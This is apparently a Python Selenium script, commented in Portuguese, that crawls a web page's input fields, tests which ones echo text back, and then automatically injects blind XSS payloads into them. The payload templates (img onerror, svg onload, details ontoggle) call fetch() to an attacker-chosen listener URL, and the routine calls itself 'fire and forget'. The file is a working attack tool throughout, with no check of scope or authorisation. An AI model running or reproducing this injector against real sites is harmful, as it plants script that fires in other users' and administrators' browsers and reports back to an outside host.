from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

TAGS_TO_FIND = ['input', 'form', 'textarea', 'select']

def find_tags(html_content, tags):
    """Função responsável por encontrar as tags passadas como parâmetro"""
    try:
        soup = BeautifulSoup(html_content, 'html.parser')
        found_tags = []

        for tag in tags:
            foud_tag_elements = soup.find_all(tag)
            for tag_elements in foud_tag_elements:
                if tag_elements:
                    tag_info = { "name" : tag_elements.get('name'),
                                "id" :  tag_elements.get('id'),
                                "type" : tag_elements.get('type'),
                                }
                    found_tags.append(tag_info)
        return found_tags
    except Exception as e:
        print(f"An error occurred while parsing HTML: {e}")
        return []

def get_rendered_html(url):
    """Captura HTML após renderização do JavaScript."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")  
    driver = webdriver.Chrome(options=chrome_options)

    try:
        driver.get(url)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body"))) 

        # Tenta fechar modal ou um popup comum para não interferir nos testes
        try:
            # Procura botão de fechar
            close_button = driver.find_element(By.XPATH, "//button[contains(@class, 'close') or contains(@aria-label, 'close') or text()='×']")
            close_button.click()
            WebDriverWait(driver, 5).until(EC.invisibility_of_element(close_button))
        except:
            try:
                # Procura botão "Dismiss" ou "OK"
                dismiss_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Dismiss') or contains(text(), 'OK') or contains(text(), 'Close')]")
                dismiss_button.click()
                WebDriverWait(driver, 5).until(EC.invisibility_of_element(dismiss_button))
            except:
                try:
                    # Tenta clicar no backdrop
                    backdrop = driver.find_element(By.CLASS_NAME, "cdk-overlay-backdrop")
                    backdrop.click()
                    WebDriverWait(driver, 5).until(EC.invisibility_of_element(backdrop))
                except:
                    try:
                        # Pressiona ESC 
                        driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)
                        WebDriverWait(driver, 5).until(EC.invisibility_of_element(backdrop))
                    except:
                        pass
        try:
            search_icon = None
            
            # Estratégia 1: mat-icon com classe mat-search_icon-search 
            try:
                search_icon = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, "mat-icon[class*='mat-search_icon-search']"))
                )
            except:
                pass
            
            # Estratégia 2: mat-icon que contém texto "search" 
            if not search_icon:
                try:
                    search_icon = WebDriverWait(driver, 3).until(
                        EC.element_to_be_clickable((By.XPATH, "//mat-icon[contains(text(), 'search')]"))
                    )
                except:
                    pass
            
            # Estratégia 3: qualquer mat-icon na barra superior (toolbar)
            if not search_icon:
                try:
                    search_icon = WebDriverWait(driver, 3).until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, "mat-toolbar mat-icon"))
                    )
                except:
                    pass
            
            # Estratégia 4: busca por data-mat-icon-type="font"
            if not search_icon:
                try:
                    search_icon = WebDriverWait(driver, 3).until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, "mat-icon[data-mat-icon-type='font']"))
                    )
                except:
                    pass
            
            # Estratégia 5: JavaScript para forçar clique em todos os mat-icons até funcionar
            if not search_icon:
                try:
                    driver.execute_script("""
                        const icons = document.querySelectorAll('mat-icon');
                        for (let icon of icons) {
                            if (icon.textContent.includes('search') || 
                                icon.className.includes('search') ||
                                icon.getAttribute('data-mat-icon-type') === 'font') {
                                icon.click();
                                break;
                            }
                        }
                    """)
                    time.sleep(2)
                except:
                    pass
            
            # Se encontrou elemento, clica normalmente
            if search_icon:
                search_icon.click()
                time.sleep(1)
            
            # Verifica se o campo ficou ativo
            try:
                WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.ID, "mat-input-1"))
                )
            except:
                # Tenta forçar ativação via JavaScript
                try:
                    driver.execute_script("""
                        const searchField = document.getElementById('mat-input-1');
                        if (searchField) {
                            searchField.focus();
                            searchField.click();
                            searchField.disabled = false;
                        }
                    """)
                    time.sleep(1)
                except:
                    pass
            
        except Exception as e:
            print(f"Erro ao ativar busca: {e}")
              
        return driver
    except Exception as e:
        print(f"An error occurred while loading the page: {e}")
        driver.quit()
        return None

def eco_test(lista, driver, test_text):
    """Função de teste para enviar um texto nos campos de input."""
    
    # Salva a URL original para voltar depois de cada teste
    original_url = driver.current_url
    results = []
    
    for element in lista:
        try:
            input_field = None
            # Pula checkboxes e outros tipos não-texto
            if element.get('type') in ['checkbox', 'radio', 'submit', 'button']:
                continue
            
            # Tratamento especial para o campo mat-input-1 (campo de busca)
            if element.get('id') == 'mat-input-1':
                try:
                    # Força a ativação da barra de pesquisa novamente
                    try:
                        search_icon = driver.find_element(By.XPATH, "//mat-icon[text()='search']")
                        search_icon.click()
                        time.sleep(1)
                    except:
                        pass
                    
                    # Aguarda específicamente até este campo ficar ativo
                    input_field = WebDriverWait(driver, 10).until(
                        EC.element_to_be_clickable((By.ID, "mat-input-1"))
                    )
                    
                    # Força o foco usando JavaScript
                    driver.execute_script("arguments[0].focus();", input_field)
                    driver.execute_script("arguments[0].click();", input_field)
                    time.sleep(0.5)
                    
                except Exception as e:
                    results.append({
                        'element': element,
                        'status': 'failed',
                        'error': f'Campo de busca mat-input-1 não pode ser ativado: {str(e)}'
                    })
                    continue
            else:
                # Tratamento normal para outros campos
                # Tenta encontrar por ID primeiro
                if element['id']:
                    try:
                        input_field = driver.find_element(By.ID, element['id'])
                        input_field.click()
                        WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.ID, element['id'])))
                    except:
                        pass
                #  Tenta encontrar por NAME
                if not input_field and element['name']:
                    try:
                        input_field = driver.find_element(By.NAME, element['name'])
                        input_field.click()
                        WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.NAME, element['name'])))
                    except:
                        pass
                    
            if input_field:
                input_field.clear() 
                input_field.send_keys(test_text)

                try:
                    # Procura por submit
                    submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                    submit_button.click()
                except:
                    # Procura por login 
                    try:
                        login_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Log in')]")
                        login_button.click()
                    except:
                        input_field.send_keys(Keys.RETURN)
                
                # Aguarda um pouco para a página processar
                time.sleep(2)
                
                # Verifica se mudou de página após o teste
                current_url = driver.current_url
                eco_result = False
                
                if current_url != original_url:
                    eco_result = eco_verificator(driver, test_text)
                else:
                    # Se não mudou, verifica na página atual
                    eco_result = eco_verificator(driver, test_text)
                
                results.append({
                    'element': element,
                    'status': 'success',
                    'payload_sent': test_text,
                    'eco_text': eco_result,
                })
                
        except Exception as e:
            results.append({
                'element': element,
                'status': 'failed',
                'error': str(e)
            })
        
        # Volta para a página original se necessário
        try:
            current_url = driver.current_url
            if current_url != original_url:
                driver.get(original_url)
                
                # Aguarda a página carregar e tenta fechar modais novamente
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                time.sleep(2)
                
                # Tenta fechar modal que pode aparecer ao voltar
                try:
                    close_button = driver.find_element(By.XPATH, "//button[contains(@class, 'close') or contains(@aria-label, 'close') or text()='×']")
                    close_button.click()
                except:
                    try:
                        dismiss_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Dismiss') or contains(text(), 'OK')]")
                        dismiss_button.click()
                    except:
                        try:
                            backdrop = driver.find_element(By.CLASS_NAME, "cdk-overlay-backdrop")
                            backdrop.click()
                        except:
                            try:
                                driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)
                            except:
                                pass
        except Exception as e:
            print(f"Erro ao verificar/voltar página: {e}")
    
    return results

def eco_verificator(driver, eco_text):
    """Verifica se o texto enviado foi processado corretamente."""
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        body_text = driver.find_element(By.TAG_NAME, "body").text
        if eco_text in body_text:
            return True
        return False
    except Exception as e:
        print(f"An error occurred during verification: {e}")
        return False

def build_payloads(url_ouvinte):
    """Cria uma lista de payloads blind xss com o link do servidor ouvinte."""
    payloads = []
    payloads_models = [
        "<img src=x onerror=fetch('{url_ouvinte}')>",
        "<svg onload=fetch('{url_ouvinte}')>",
        "<details open ontoggle=fetch('{url_ouvinte}')>"
    ]

    for model in payloads_models:
        payloads.append(model.format(url_ouvinte=url_ouvinte))
    return payloads


def blind_xss_injection(campos_validos, driver, url_ouvinte):
    """Injeta payloads blind XSS - estratégia 'disparar e esquecer'"""
    
    # Salva a URL original para voltar depois de cada injeção
    original_url = driver.current_url
    injected_payloads = []
    
    try:
        # Cria payloads com o link do servidor ouvinte
        payloads = build_payloads(url_ouvinte)
        for payload in payloads:
            for campo in campos_validos:
                try:
                    # Usa diretamente os campos que já foram validados pelo eco_test
                    field_name = campo['element'].get('name') or campo['element'].get('id')
                    # Encontra o elemento novamente
                    if campo['element']['id']:
                        input_field = driver.find_element(By.ID, campo['element']['id'])
                    elif campo['element']['name']:
                        input_field = driver.find_element(By.NAME, campo['element']['name'])
                    else:
                        continue
                    # Injeção blind XSS
                    input_field.clear()
                    input_field.send_keys(payload)
                    input_field.send_keys(Keys.RETURN)
                    
                    injected_payloads.append({
                        'payload': payload,
                        'field_name': field_name,
                        'status': 'injected'
                    })
                    
                    # Verifica se mudou de página após a injeção
                    try:
                        current_url = driver.current_url
                        if current_url != original_url:
                            driver.get(original_url)
                            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                            time.sleep(2)
                            
                            # Fecha modais se necessário
                            try:
                                backdrop = driver.find_element(By.CLASS_NAME, "cdk-overlay-backdrop")
                                backdrop.click()
                            except:
                                pass
                    except Exception as nav_error:
                        print(f"[!] Erro ao navegar de volta: {nav_error}")
                        
                except Exception as e:
                    print(f"Falha ao injetar blind XSS no campo: {e}")
                    continue
        
        return injected_payloads
    except Exception as e:
        print(f"An error occurred during blind XSS injection testing: {e}")
        return []

